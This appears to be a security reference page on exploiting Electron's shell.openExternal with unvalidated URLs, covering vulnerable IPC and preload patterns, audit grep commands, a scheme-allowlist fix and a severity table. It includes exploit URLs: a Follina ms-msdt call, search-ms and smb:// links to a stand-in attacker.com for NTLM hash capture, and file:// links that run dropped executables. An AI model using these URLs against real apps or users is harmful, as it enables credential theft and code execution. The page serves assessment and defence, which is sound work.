---
title: shell.openExternal Abuse
description: Exploiting Electron's shell.openExternal with attacker-controlled URLs — protocol handlers, file execution, NTLM capture
---

# shell.openExternal Abuse

Every Electron app that opens links uses `shell.openExternal`. It's how Electron hands a URL off to the operating system and says "you handle this." For `https://` that opens the browser. For `mailto:` it opens the email client. For `ms-msdt://` on unpatched Windows, it opens the Microsoft Support Diagnostic Tool and executes whatever command the URL encodes.

The vulnerability class is simple: `shell.openExternal` with an attacker-controlled URL. The impact depends on the protocol, the platform, and the patch state of the OS. The pattern shows up constantly because "open links in the browser" is a legitimate, necessary feature, and the step from "open this https:// link" to "open whatever URL the renderer sends" is one line of missing validation.

---

## The Vulnerable Pattern

```javascript
// Legitimate-looking link handler:
function handleLinkClick(url) {
  shell.openExternal(url);  // url is renderer-controlled — no scheme check
}

// Via IPC:
ipcMain.on('open-link', (event, url) => {
  shell.openExternal(url);
});

// Via preload bridge:
contextBridge.exposeInMainWorld('api', {
  openURL: (url) => shell.openExternal(url)
  // Looks like a safe wrapper. Isn't.
});
```

The Slack zero-click was exactly this pattern: a preload bridge exposed `openURL`, the main process handler called `shell.openExternal`, and neither validated the URL scheme. An attacker who could write the workspace name controlled the URL.

---

## Exploitation by Platform

### Windows: ms-msdt (Follina — CVE-2022-30190)

```
shell.openExternal('ms-msdt:/id PCWDiagnostic /skip force /param "..."')
→ Windows MSDT executes
→ RCE on systems without KB5014699
```

Follina is patched, but the technique it represented — OS protocol handlers as code execution primitives — isn't going away. New handlers get registered, new vulnerabilities get found.

### Windows: search-ms — NTLM Capture

```
shell.openExternal('search-ms:query=test&crumb=location:file://attacker.com/share')
→ Windows Explorer opens search against attacker's UNC path
→ OS attempts NTLM auth → Net-NTLMv2 hash captured by Responder
→ Crack offline or relay to pivot internally
```

This one doesn't need Follina to be unpatched. Windows always tries to authenticate to UNC paths. All you need is Responder running.

### Windows: file:// — Local Executable

```
shell.openExternal('file:///C:/Windows/System32/calc.exe')
→ Windows shell opens the executable
shell.openExternal('file:///C:/Users/Public/dropped.exe')
→ Executes a previously-dropped binary
```

### macOS: Custom Protocol Handlers

```
shell.openExternal('x-apple-helpviewer://...')
shell.openExternal('com.apple.installer://...')
→ Triggers potentially vulnerable OS handlers
```

macOS Gatekeeper blocks many of the worst cases, but specific vulnerable handlers in OS software have been abused.

### All Platforms: smb:// — NTLM

```
shell.openExternal('smb://attacker.com/share')
→ OS authenticates with NTLM automatically
→ Net-NTLMv2 hash goes to attacker's server
```

---

## Finding It During an Assessment

```bash
# Find all shell.openExternal calls:
grep -rn "shell\.openExternal\|openExternal" --include="*.js" . | grep -v node_modules

# Check if there's URL validation before the call:
grep -rn "openExternal" --include="*.js" . -B 10 | \
  grep -E "new URL|protocol\b|allowedSchemes\|startsWith.*https" | grep -v node_modules

# Find IPC handlers that call openExternal:
grep -r "ipcMain\.\(on\|handle\)" --include="*.js" . -A 10 | \
  grep "openExternal" | grep -v node_modules

# Find bridge functions that expose openExternal:
grep -r "exposeInMainWorld" --include="*.js" . -A 20 | \
  grep "openExternal" | grep -v node_modules
```

The question after finding `shell.openExternal` is: what are the 10 lines before it? Is there a `new URL(url)` parse followed by a protocol check? If not, flag it and trace backward to find how the URL gets there from attacker-controlled input.

---

## The Fix

```javascript
function safeOpen(url) {
  const ALLOWED_SCHEMES = ['https:', 'http:', 'mailto:'];
  let parsed;
  try {
    parsed = new URL(url);
  } catch {
    return false;  // Invalid URL — reject
  }
  if (!ALLOWED_SCHEMES.includes(parsed.protocol)) {
    // Log blocked attempts — useful for security monitoring:
    console.warn(`Blocked URL scheme: ${parsed.protocol} in: ${url}`);
    return false;
  }
  shell.openExternal(url);
  return true;
}
```

Note what's being validated: the *scheme* of the parsed URL, checked against an allowlist. Not a regex on the raw string (bypassable with URL encoding or unusual parsing). Not a `startsWith('https')` check (bypassable with `https://\nms-msdt://...` in some parsers). A real `URL` parse, then a `.protocol` comparison against an explicit allowlist.

---

## Severity

| Context | Severity |
|---------|----------|
| XSS → openExternal → ms-msdt (unpatched Windows) | Critical |
| XSS → openExternal → file:// executable | Critical |
| XSS → openExternal → smb:// NTLM capture | High |
| IPC directly callable from renderer → openExternal | High |
| openExternal with https:// scheme validation only | Low (safe) |

Slack's $30,000 payout for this class of bug reflects what it means at scale: not targeted exploitation but mass exploitation of every user of the app. The combination of stored XSS + unvalidated openExternal is what earns the top bounty tiers.
